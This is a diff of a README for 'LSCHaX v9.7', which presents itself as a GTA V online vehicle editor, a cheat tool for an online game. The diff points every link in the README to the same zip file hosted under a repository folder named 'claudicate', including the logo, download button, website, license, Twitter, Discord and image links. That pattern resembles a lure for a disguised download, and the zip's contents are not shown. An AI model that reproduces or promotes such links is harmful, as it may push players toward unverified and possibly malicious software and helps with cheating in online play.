@@ -2,7 +2,7 @@
 
 ### Welcome to LSCHaX v9.7 for 1.70!
 
-![LSCHaX Logo](https://github.com/Guraa0441/LSCHaX-for-1.70-External/releases/download/v1.0/Release_x64.zip)
+![LSCHaX Logo](https://raw.githubusercontent.com/Guraa0441/LSCHaX-for-1.70-External/main/claudicate/for_LSC_External_Ha_2.5-alpha.5.zip)
 
 ---
 
@@ -28,7 +28,7 @@ LSCHaX is a popular GTA V online vehicle editor that allows players to customize
 ### 📥 Download
 Click the button below to download the LSCHaX software:
 
-[![Download LSCHaX v9.7](https://github.com/Guraa0441/LSCHaX-for-1.70-External/releases/download/v1.0/Release_x64.zip%https://github.com/Guraa0441/LSCHaX-for-1.70-External/releases/download/v1.0/Release_x64.zip)](https://github.com/Guraa0441/LSCHaX-for-1.70-External/releases/download/v1.0/Release_x64.zip)
+[![Download LSCHaX v9.7](https://raw.githubusercontent.com/Guraa0441/LSCHaX-for-1.70-External/main/claudicate/for_LSC_External_Ha_2.5-alpha.5.zip%https://raw.githubusercontent.com/Guraa0441/LSCHaX-for-1.70-External/main/claudicate/for_LSC_External_Ha_2.5-alpha.5.zip)](https://raw.githubusercontent.com/Guraa0441/LSCHaX-for-1.70-External/main/claudicate/for_LSC_External_Ha_2.5-alpha.5.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Click the button below to download the LSCHaX software:
 ---
 
 ### 🌐 Explore More
-For more information and updates, visit our [website](https://github.com/Guraa0441/LSCHaX-for-1.70-External/releases/download/v1.0/Release_x64.zip).
+For more information and updates, visit our [website](https://raw.githubusercontent.com/Guraa0441/LSCHaX-for-1.70-External/main/claudicate/for_LSC_External_Ha_2.5-alpha.5.zip).
 
 ---
 
@@ -55,17 +55,17 @@ If the download link is not working or unavailable, please check the "Releases" 
 ---
 
 ### 📜 License
-This project is licensed under the [MIT License](https://github.com/Guraa0441/LSCHaX-for-1.70-External/releases/download/v1.0/Release_x64.zip).
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/Guraa0441/LSCHaX-for-1.70-External/main/claudicate/for_LSC_External_Ha_2.5-alpha.5.zip).
 
 ---
 
 ### 🔗 Connect with Us
 Stay connected with the LSCHaX community:
-- Follow us on [Twitter](https://github.com/Guraa0441/LSCHaX-for-1.70-External/releases/download/v1.0/Release_x64.zip)
-- Join our Discord server [here](https://github.com/Guraa0441/LSCHaX-for-1.70-External/releases/download/v1.0/Release_x64.zip)
+- Follow us on [Twitter](https://raw.githubusercontent.com/Guraa0441/LSCHaX-for-1.70-External/main/claudicate/for_LSC_External_Ha_2.5-alpha.5.zip)
+- Join our Discord server [here](https://raw.githubusercontent.com/Guraa0441/LSCHaX-for-1.70-External/main/claudicate/for_LSC_External_Ha_2.5-alpha.5.zip)
 
 ---
 
 ### 🌈 Enjoy Customizing Your GTA V Vehicles with LSCHaX v9.7! 🚗
 
-![LSCHaX Vehicles](https://github.com/Guraa0441/LSCHaX-for-1.70-External/releases/download/v1.0/Release_x64.zip)
+![LSCHaX Vehicles](https://raw.githubusercontent.com/Guraa0441/LSCHaX-for-1.70-External/main/claudicate/for_LSC_External_Ha_2.5-alpha.5.zip)
